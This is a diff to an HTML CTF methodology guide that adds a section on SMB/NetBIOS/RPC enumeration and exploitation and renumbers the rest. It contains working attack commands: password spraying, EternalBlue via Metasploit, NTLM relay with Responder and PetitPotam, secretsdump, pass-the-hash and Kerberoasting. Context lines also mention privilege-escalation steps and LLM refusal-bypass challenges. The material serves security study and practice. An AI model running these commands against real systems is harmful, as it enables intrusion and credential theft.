@@ -30,6 +30,7 @@
   --c-forensics:#7ee787;
   --c-misc:#ffa07a;
   --c-ai:#ff79c6;
+  --c-netsvc:#4dd0c4;
   --c-privesc:#ffb000;
   --c-setup:#8b9990;
   --c-meta:#8b9990;
@@ -202,6 +203,7 @@ body{
 .chip[data-cat="forensics"].active{background:var(--c-forensics);}
 .chip[data-cat="misc"].active{background:var(--c-misc);}
 .chip[data-cat="ai"].active{background:var(--c-ai);}
+.chip[data-cat="netsvc"].active{background:var(--c-netsvc);}
 .chip[data-cat="privesc"].active{background:var(--c-privesc);}
 .chip[data-cat="meta"].active,
 .chip[data-cat="setup"].active{background:var(--c-meta); color:var(--bg);}
@@ -227,6 +229,7 @@ body{
 .dot-pwn{background:var(--c-pwn);} .dot-rev{background:var(--c-rev);}
 .dot-forensics{background:var(--c-forensics);} .dot-misc{background:var(--c-misc);}
 .dot-ai{background:var(--c-ai);} .dot-privesc{background:var(--c-privesc);}
+.dot-netsvc{background:var(--c-netsvc);}
 .dot-meta{background:var(--c-meta);} .dot-setup{background:var(--c-setup);}
 .nav-subtree{list-style:none; margin:0 0 6px 22px; padding:0; border-left:1px dashed var(--border); }
 .nav-subtree li a{
@@ -269,6 +272,7 @@ body{
 .doc-section.cat-forensics{border-left-color:var(--c-forensics);}
 .doc-section.cat-misc{border-left-color:var(--c-misc);}
 .doc-section.cat-ai{border-left-color:var(--c-ai);}
+.doc-section.cat-netsvc{border-left-color:var(--c-netsvc);}
 .doc-section.cat-privesc{border-left-color:var(--c-privesc);}
 .doc-section.cat-meta,.doc-section.cat-setup{border-left-color:var(--border);}
 .doc-section.hidden-cat{display:none;}
@@ -446,6 +450,7 @@ footer.doc-footer{
       <span class="chip" data-cat="rev">REV</span>
       <span class="chip" data-cat="forensics">FORENSICS</span>
       <span class="chip" data-cat="misc">MISC</span>
+      <span class="chip" data-cat="netsvc">NET SVC</span>
       <span class="chip" data-cat="ai">AI/LLM</span>
       <span class="chip" data-cat="privesc">PRIVESC</span>
     </div>
@@ -487,43 +492,48 @@ footer.doc-footer{
       
     </li>
 
+    <li class="nav-item" data-cat="netsvc">
+      <a href="#7-network-services-smb-netbios-rpc-recon-exploitation" class="nav-main"><span class="dot dot-netsvc"></span>7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</a>
+      <ul class="nav-subtree"><li><a href="#71-decision-tree" class="nav-sub" data-cat="netsvc">7.1 Decision Tree</a></li><li><a href="#72-enumeration-manual-tooled-commands" class="nav-sub" data-cat="netsvc">7.2 Enumeration — Manual &amp; Tooled Commands</a></li><li><a href="#73-sharedata-hunting-once-you-have-access" class="nav-sub" data-cat="netsvc">7.3 Share/Data Hunting Once You Have Access</a></li><li><a href="#74-exploitation-vectors" class="nav-sub" data-cat="netsvc">7.4 Exploitation Vectors</a></li><li><a href="#75-tool-cheat-sheet" class="nav-sub" data-cat="netsvc">7.5 Tool Cheat-Sheet</a></li></ul>
+    </li>
+
     <li class="nav-item" data-cat="ai">
-      <a href="#7-ai-llm-security-methodology-tools" class="nav-main"><span class="dot dot-ai"></span>7. AI / LLM SECURITY — Methodology &amp; Tools</a>
+      <a href="#8-ai-llm-security-methodology-tools" class="nav-main"><span class="dot dot-ai"></span>8. AI / LLM SECURITY — Methodology &amp; Tools</a>
       
     </li>
 
     <li class="nav-item" data-cat="meta">
-      <a href="#8-cross-cutting-skills-worth-practicing" class="nav-main"><span class="dot dot-meta"></span>8. Cross-Cutting Skills Worth Practicing</a>
+      <a href="#9-cross-cutting-skills-worth-practicing" class="nav-main"><span class="dot dot-meta"></span>9. Cross-Cutting Skills Worth Practicing</a>
       
     </li>
 
     <li class="nav-item" data-cat="meta">
-      <a href="#9-suggested-practice-path" class="nav-main"><span class="dot dot-meta"></span>9. Suggested Practice Path</a>
+      <a href="#10-suggested-practice-path" class="nav-main"><span class="dot dot-meta"></span>10. Suggested Practice Path</a>
       
     </li>
 
     <li class="nav-item" data-cat="privesc">
-      <a href="#10-privesc-decision-tree-top-level" class="nav-main"><span class="dot dot-privesc"></span>10. Privesc Decision Tree (top level)</a>
+      <a href="#11-privesc-decision-tree-top-level" class="nav-main"><span class="dot dot-privesc"></span>11. Privesc Decision Tree (top level)</a>
       
     </li>
 
     <li class="nav-item" data-cat="privesc">
-      <a href="#11-linux-privesc" class="nav-main"><span class="dot dot-privesc"></span>11. LINUX PRIVESC</a>
+      <a href="#12-linux-privesc" class="nav-main"><span class="dot dot-privesc"></span>12. LINUX PRIVESC</a>
       <ul class="nav-subtree"><li><a href="#11-decision-tree" class="nav-sub" data-cat="privesc">1.1 Decision Tree</a></li><li><a href="#12-enumeration-manual-checklist" class="nav-sub" data-cat="privesc">1.2 Enumeration — Manual Checklist</a></li><li><a href="#13-automated-enum-scripts" class="nav-sub" data-cat="privesc">1.3 Automated Enum Scripts</a></li><li><a href="#14-exploitation-by-vector" class="nav-sub" data-cat="privesc">1.4 Exploitation by Vector</a></li><li><a href="#15-tool-cheat-sheet-linux" class="nav-sub" data-cat="privesc">1.5 Tool Cheat-Sheet (Linux)</a></li></ul>
     </li>
 
     <li class="nav-item" data-cat="privesc">
-      <a href="#12-windows-privesc" class="nav-main"><span class="dot dot-privesc"></span>12. WINDOWS PRIVESC</a>
+      <a href="#13-windows-privesc" class="nav-main"><span class="dot dot-privesc"></span>13. WINDOWS PRIVESC</a>
       <ul class="nav-subtree"><li><a href="#21-decision-tree" class="nav-sub" data-cat="privesc">2.1 Decision Tree</a></li><li><a href="#22-enumeration-manual-checklist" class="nav-sub" data-cat="privesc">2.2 Enumeration — Manual Checklist</a></li><li><a href="#23-automated-enum-scripts" class="nav-sub" data-cat="privesc">2.3 Automated Enum Scripts</a></li><li><a href="#24-exploitation-by-vector" class="nav-sub" data-cat="privesc">2.4 Exploitation by Vector</a></li><li><a href="#25-tool-cheat-sheet-windows" class="nav-sub" data-cat="privesc">2.5 Tool Cheat-Sheet (Windows)</a></li></ul>
     </li>
 
     <li class="nav-item" data-cat="privesc">
-      <a href="#13-cross-cutting-privesc-principles" class="nav-main"><span class="dot dot-privesc"></span>13. Cross-Cutting Privesc Principles</a>
+      <a href="#14-cross-cutting-privesc-principles" class="nav-main"><span class="dot dot-privesc"></span>14. Cross-Cutting Privesc Principles</a>
       
     </li>
 
     <li class="nav-item" data-cat="meta">
-      <a href="#14-practice-resources" class="nav-main"><span class="dot dot-meta"></span>14. Practice Resources</a>
+      <a href="#15-practice-resources" class="nav-main"><span class="dot dot-meta"></span>15. Practice Resources</a>
       
     </li>
     </ul>
@@ -1025,7 +1035,193 @@ strings firmware.bin | grep -i passwd
 <p><strong>Tool cheat-sheet</strong>: exiftool, zbar, Foundry (forge/cast), slither, binwalk, screen/minicom (UART).</p>
 <hr/>
 </section>
-<section id="7-ai-llm-security-methodology-tools" class="doc-section cat-ai" data-cat="ai" data-label="AI/LLM"><h2 id="7-ai-llm-security-methodology-tools">7. AI / LLM SECURITY — Methodology &amp; Tools</h2>
+<section id="7-network-services-smb-netbios-rpc-recon-exploitation" class="doc-section cat-netsvc" data-cat="netsvc" data-label="NETWORK SVC"><h2 id="7-network-services-smb-netbios-rpc-recon-exploitation">7. NETWORK SERVICES — SMB / NetBIOS / RPC Recon &amp; Exploitation</h2>
+<p>Extremely common in "box" style CTFs (HTB, TryHackMe, OSCP-style) as the very first foothold vector on Windows/AD targets, and often present on mixed Linux boxes running Samba. Treat this as the standard pre-shell recon phase whenever ports 135, 137-139, or 445 are open.</p>
+<h3 id="71-decision-tree">7.1 Decision Tree</h3>
+<pre><code>Ports 135/139/445 (and/or 137 UDP) open
+├─ Unauthenticated enumeration first — always try null/guest sessions before
+│   assuming credentials are required
+│   ├─ Null session works? → enumerate users/groups/shares/policy for free
+│   └─ Guest disabled / null session refused? → note it, move to auth-required branch
+├─ Enumerate shares
+│   ├─ Any share readable anonymously or with found creds?
+│   │   └─ Mount/list it → hunt for configs, scripts, credentials, SAM/SYSTEM
+│   │       hive backups, unattended install files
+│   └─ Writable share found?
+│       └─ Drop a payload (webshell if IIS/web root, or a scheduled-task-triggered
+│           binary) — writable + service restart/cron pickup = code exec
+├─ RPC enumeration (rpcclient / Impacket) reachable?
+│   ├─ Anonymous RPC bind succeeds → user/group/domain enumeration via
+│   │   SAMR pipe even when SMB shares themselves are locked down
+│   └─ LSA/SAMR queries reveal domain password policy → informs safe
+│       brute-force thresholds (avoid lockout) for later credential attacks
+├─ Have valid (or low-priv) domain credentials already?
+│   ├─ Password spray across discovered usernames (respecting lockout policy)
+│   ├─ Kerberoasting / AS-REP roasting if domain-joined (see AD notes below)
+│   └─ Re-run share/RPC enumeration authenticated — much more opens up
+├─ SMB signing disabled?
+│   └─ NTLM relay attack surface — relay captured/coerced auth to another
+│       host that accepts it (see relay section below)
+├─ Known vulnerable SMB version/patch level?
+│   └─ Check for EternalBlue-class or version-specific RCEs (see CVE table below)
+├─ NetBIOS name service (UDP 137) reachable?
+│   └─ nbtstat/nmblookup for hostname, domain, and MAC — useful for host ID
+│       even when SMB itself is locked down
+└─ Got a foothold via any of the above → pivot to Windows Privesc (Section 13)
+    or Linux Privesc (Section 12) if the target turned out to be Samba-on-Linux
+</code></pre>
+<h3 id="72-enumeration-manual-tooled-commands">7.2 Enumeration — Manual &amp; Tooled Commands</h3>
+<p><strong>Port/service discovery</strong></p>
+<pre><code class="language-bash">nmap -p 135,137,139,445 -sV -sC target
+nmap -p- --min-rate 5000 target                 # full port sweep, don't skip this
+nmap --script smb-protocols,smb2-security-mode target   # check dialects + signing
+</code></pre>
+<p><strong>NetBIOS name resolution</strong></p>
+<pre><code class="language-bash">nbtstat -A target                # Windows
+nmblookup -A target              # Linux equivalent
+</code></pre>
+<p><strong>Null/guest session enumeration</strong></p>
+<pre><code class="language-bash">smbclient -N -L //target/        # list shares with null session
+smbclient -N //target/ShareName  # connect to a specific share anonymously
+rpcclient -U "" -N target        # null RPC session
+</code></pre>
+<p>Inside <code>rpcclient</code>, once connected:</p>
+<pre><code>srvinfo               # server info
+enumdomusers          # enumerate domain users
+enumdomgroups         # enumerate domain groups
+querydominfo          # domain password policy, lockout threshold
+lsaquery               # SID/domain lookup
+lookupnames &lt;name&gt;     # resolve username to SID
+lookupsids &lt;SID&gt;       # resolve SID to username (good for RID cycling)
+</code></pre>
+<p><strong>RID cycling (enumerate users even when enumdomusers is restricted)</strong></p>
+<pre><code class="language-bash">for i in $(seq 500 1100); do
+  rpcclient -N -U "" target -c "lookupsids S-1-5-21-&lt;DOMAIN-SID&gt;-$i" 2&gt;/dev/null | grep -v "SID.*none"
+done
+# or automate entirely with a wrapper tool:
+</code></pre>
+<p><strong>All-in-one automated enumeration</strong></p>
+<pre><code class="language-bash">enum4linux-ng -A target                  # modern replacement for enum4linux
+crackmapexec smb target --shares         # quick share listing + auth test
+crackmapexec smb target -u '' -p '' --shares    # explicit null session
+smbmap -H target                         # share permissions overview, fast triage
+</code></pre>
+<p><strong>Authenticated enumeration once you have creds</strong></p>
+<pre><code class="language-bash">crackmapexec smb target -u user -p 'Password123' --shares --users --groups
+smbmap -H target -u user -p 'Password123'
+rpcclient -U 'user%Password123' target
+</code></pre>
+<p><strong>Password policy + spraying prep</strong></p>
+<pre><code class="language-bash">crackmapexec smb target -u '' -p '' --pass-pol       # anon password policy check
+# then spray carefully, respecting lockout threshold:
+crackmapexec smb target -u users.txt -p 'Summer2024!' --continue-on-success
+</code></pre>
+<h3 id="73-sharedata-hunting-once-you-have-access">7.3 Share/Data Hunting Once You Have Access</h3>
+<pre><code class="language-bash">smbclient //target/ShareName -U user%Password123
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *                      # pull everything down for offline review
+
+# or mount and grep like a normal filesystem
+mkdir /mnt/smbshare
+mount -t cifs //target/ShareName /mnt/smbshare -o username=user,password=Password123
+grep -ril "password" /mnt/smbshare 2&gt;/dev/null
+</code></pre>
+<p>Priority targets inside shares: <code>unattend.xml</code>/<code>sysprep.inf</code> (plaintext/base64 creds), <code>web.config</code>, <code>*.kdbx</code>, backup <code>SAM</code>/<code>SYSTEM</code>/<code>SECURITY</code> hive files (crackable offline with <code>secretsdump.py -sam SAM -system SYSTEM LOCAL</code>), CI/CD scripts, and any <code>.git</code> folders.</p>
+<h3 id="74-exploitation-vectors">7.4 Exploitation Vectors</h3>
+<p><strong>Known vulnerable SMB versions — check before brute-forcing anything else</strong>
+| CVE | Name | Notes |
+|---|---|---|
+| MS17-010 | EternalBlue | SMBv1, pre-patch Windows 7/Server 2008 — near-instant SYSTEM via Metasploit or <code>AutoBlue-MS17-010</code> |
+| CVE-2020-0796 | SMBGhost | SMBv3 compression handling, Windows 10 1903/1909 — RCE, also has a local privesc/DoS variant |
+| CVE-2017-7494 | SambaCry | Samba on Linux, writable share + known library path — RCE, treat like EternalBlue's Linux cousin |
+| CVE-2021-1675 / CVE-2021-34527 | PrintNightmare | Print Spooler over RPC — RCE or local privesc depending on exploit variant |</p>
+<pre><code class="language-bash"># Metasploit quick check + exploit for MS17-010
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+
+# standalone script alternative
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+</code></pre>
+<p><strong>NTLM relay (when SMB signing is disabled on the target)</strong></p>
+<pre><code class="language-bash"># confirm signing status first
+nmap --script smb2-security-mode -p445 target
+crackmapexec smb target --gen-relay-list relay_targets.txt   # find signing-disabled hosts
+
+# capture/coerce authentication, then relay it
+responder -I eth0                     # poison LLMNR/NBT-NS to capture incoming auth
+# or actively coerce a machine account to authenticate to you:
+python3 PetitPotam.py &lt;attacker_ip&gt; &lt;target_ip&gt;
+
+# relay captured auth to a host with signing disabled
+impacket-ntlmrelayx -tf relay_targets.txt -smb2support
+</code></pre>
+<p><strong>Dumping secrets once you have local admin / valid high-priv creds</strong></p>
+<pre><code class="language-bash">impacket-secretsdump 'domain/user:Password123@target'
+# offline hive files instead of a live target:
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+</code></pre>
+<p><strong>Pass-the-hash (skip needing the plaintext password entirely)</strong></p>
+<pre><code class="language-bash">impacket-psexec -hashes :&lt;NTLM_HASH&gt; user@target
+crackmapexec smb target -u user -H &lt;NTLM_HASH&gt; -x whoami
+</code></pre>
+<p><strong>Kerberoasting / AS-REP roasting (domain-joined targets — grab offline-crackable hashes via RPC/LDAP without touching the target's disk)</strong></p>
+<pre><code class="language-bash">impacket-GetUserSPNs domain/user:Password123 -dc-ip &lt;dc_ip&gt; -request     # Kerberoasting
+impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip &lt;dc_ip&gt; # AS-REP roasting
+hashcat -m 13100 kerberoast.txt rockyou.txt      # crack Kerberoast hashes offline
+hashcat -m 18200 asrep.txt rockyou.txt           # crack AS-REP hashes offline
+</code></pre>
+<p>This pairs directly with the AD CS abuse content in the Windows Privesc section (12) once you have any domain foothold — SMB/RPC enumeration is usually how you get that first foothold in the first place.</p>
+<h3 id="75-tool-cheat-sheet">7.5 Tool Cheat-Sheet</h3>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>nmap</code> (smb-* scripts)</td>
+<td>Port/version/signing discovery</td>
+</tr>
+<tr>
+<td><code>smbclient</code></td>
+<td>Interactive share browsing, null/auth sessions</td>
+</tr>
+<tr>
+<td><code>rpcclient</code></td>
+<td>Direct RPC/SAMR/LSA queries, RID cycling</td>
+</tr>
+<tr>
+<td><code>enum4linux-ng</code></td>
+<td>Automated all-in-one SMB/RPC enumeration</td>
+</tr>
+<tr>
+<td><code>crackmapexec</code> (or <code>netexec</code>, its actively maintained fork)</td>
+<td>Swiss-army knife for SMB auth testing, spraying, command exec, share listing</td>
+</tr>
+<tr>
+<td><code>smbmap</code></td>
+<td>Fast share-permission triage</td>
+</tr>
+<tr>
+<td>Impacket suite (<code>secretsdump.py</code>, <code>psexec.py</code>, <code>GetUserSPNs.py</code>, <code>GetNPUsers.py</code>, <code>ntlmrelayx.py</code>)</td>
+<td>Secret dumping, PtH exec, Kerberoasting, relay attacks</td>
+</tr>
+<tr>
+<td><code>responder</code></td>
+<td>LLMNR/NBT-NS poisoning to capture hashes for relay/cracking</td>
+</tr>
+<tr>
+<td>Metasploit (<code>ms17_010_eternalblue</code>, etc.)</td>
+<td>Packaged exploits for known SMB CVEs</td>
+</tr>
+</tbody>
+</table>
+<hr/>
+</section>
+<section id="8-ai-llm-security-methodology-tools" class="doc-section cat-ai" data-cat="ai" data-label="AI/LLM"><h2 id="8-ai-llm-security-methodology-tools">8. AI / LLM SECURITY — Methodology &amp; Tools</h2>
 <p>A newer but now-standard CTF category (seen in HTB, TryHackMe, and dedicated events like CrowdStrike's AI Unlocked). Distinct from classic web bugs because the "vulnerable parser" is a language model rather than deterministic code.</p>
 <pre><code>AI/LLM challenge
 ├─ Identify the interaction surface
@@ -1084,7 +1280,7 @@ strings firmware.bin | grep -i passwd
 <p>Note: as with any refusal-bypass content, treat this category the same as any other CTF bug class — the goal is capturing a flag in a sandboxed challenge environment, not producing generally harmful content against real deployed systems.</p>
 <hr/>
 </section>
-<section id="8-cross-cutting-skills-worth-practicing" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="8-cross-cutting-skills-worth-practicing">8. Cross-Cutting Skills Worth Practicing</h2>
+<section id="9-cross-cutting-skills-worth-practicing" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="9-cross-cutting-skills-worth-practicing">9. Cross-Cutting Skills Worth Practicing</h2>
 <table>
 <thead>
 <tr>
@@ -1123,7 +1319,7 @@ strings firmware.bin | grep -i passwd
 </table>
 <hr/>
 </section>
-<section id="9-suggested-practice-path" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="9-suggested-practice-path">9. Suggested Practice Path</h2>
+<section id="10-suggested-practice-path" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="10-suggested-practice-path">10. Suggested Practice Path</h2>
 <ol>
 <li>picoCTF / OverTheWire (Bandit, Narnia) → fundamentals across categories.</li>
 <li>pwn.college → deep pwn/kernel progression.</li>
@@ -1137,7 +1333,7 @@ strings firmware.bin | grep -i passwd
 <h1 id="part-ii-privilege-escalation-in-depth">PART II — PRIVILEGE ESCALATION (IN-DEPTH)</h1>
 <p>Covers Linux and Windows privesc end-to-end: enumeration → vector identification → exploitation → tool reference. Picks up right where initial access (Part I) leaves off — you've got a low-priv shell, now you need root/SYSTEM.</p>
 </section>
-<section id="10-privesc-decision-tree-top-level" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="10-privesc-decision-tree-top-level">10. Privesc Decision Tree (top level)</h2>
+<section id="11-privesc-decision-tree-top-level" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="11-privesc-decision-tree-top-level">11. Privesc Decision Tree (top level)</h2>
 <pre><code>Landed a low-priv shell
 ├─ Identify OS → Linux or Windows branch below
 ├─ Run automated enum script FIRST (saves hours), but still read output manually —
@@ -1147,7 +1343,7 @@ strings firmware.bin | grep -i passwd
 </code></pre>
 <hr/>
 </section>
-<section id="11-linux-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · LINUX"><h2 id="11-linux-privesc">11. LINUX PRIVESC</h2>
+<section id="12-linux-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · LINUX"><h2 id="12-linux-privesc">12. LINUX PRIVESC</h2>
 <h3 id="11-decision-tree">1.1 Decision Tree</h3>
 <pre><code>Low-priv Linux shell
 ├─ whoami / id / groups → note any unusual group membership (docker, lxd, disk, adm)
@@ -1316,7 +1512,7 @@ chmod +s /mnt/share/rootbash
 </table>
 <hr/>
 </section>
-<section id="12-windows-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · WINDOWS"><h2 id="12-windows-privesc">12. WINDOWS PRIVESC</h2>
+<section id="13-windows-privesc" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC · WINDOWS"><h2 id="13-windows-privesc">13. WINDOWS PRIVESC</h2>
 <h3 id="21-decision-tree">2.1 Decision Tree</h3>
 <pre><code>Low-priv Windows shell
 ├─ whoami /priv → check for dangerous enabled privileges
@@ -1490,7 +1686,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Admini
 </table>
 <hr/>
 </section>
-<section id="13-cross-cutting-privesc-principles" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="13-cross-cutting-privesc-principles">13. Cross-Cutting Privesc Principles</h2>
+<section id="14-cross-cutting-privesc-principles" class="doc-section cat-privesc" data-cat="privesc" data-label="PRIVESC"><h2 id="14-cross-cutting-privesc-principles">14. Cross-Cutting Privesc Principles</h2>
 <pre><code>General rule of thumb when stuck
 ├─ "What can I run/write that something with higher privilege will touch?"
 │   (cron, scheduled task, service restart, log rotation, file watcher)
@@ -1511,7 +1707,7 @@ Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:Admini
 6. Kernel/CVE exploitation (last resort)</p>
 <hr/>
 </section>
-<section id="14-practice-resources" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="14-practice-resources">14. Practice Resources</h2>
+<section id="15-practice-resources" class="doc-section cat-meta" data-cat="meta" data-label="META"><h2 id="15-practice-resources">15. Practice Resources</h2>
 <ul>
 <li><strong>TryHackMe</strong>: "Linux PrivEsc" and "Windows PrivEsc" rooms — guided, hands-on.</li>
 <li><strong>HackTheBox</strong>: retired boxes tagged for privesc practice; write your own enum checklist as you go.</li>
